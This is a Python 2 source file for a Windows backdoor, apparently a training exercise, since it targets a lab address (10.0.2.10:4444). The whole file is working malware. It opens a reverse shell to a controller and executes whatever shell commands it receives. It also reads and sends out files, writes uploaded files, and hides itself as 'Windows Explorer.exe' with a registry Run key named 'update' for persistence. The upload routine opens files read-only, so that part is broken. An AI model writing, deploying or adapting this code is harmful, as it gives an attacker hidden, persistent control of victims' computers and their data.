#!/usr/bin/env python
import base64
import os
import shutil
import socket
import subprocess
import json
import sys


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        # python 3
        # return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        # py3 self.connection.send(json_data.encode())
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file_down:
            return base64.b64encode(file_down.read())

    def write_file(self, path, content):
        with open(path, "rb") as file_down:
            file_down.write(base64.b64decode(content))
            return "[+] Upload successful."

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copy(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"')

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    # py3 command_result = self.read_file(command[1]).decode()
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    # py3 command_result = self.execute_system_command(command).decode()
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = "[-] Errors during command execution."

            self.reliable_send(command_result)

try:
    my_backdoor = Backdoor("10.0.2.10", 4444)
    my_backdoor.run()
except Exception as e:
    sys.exit()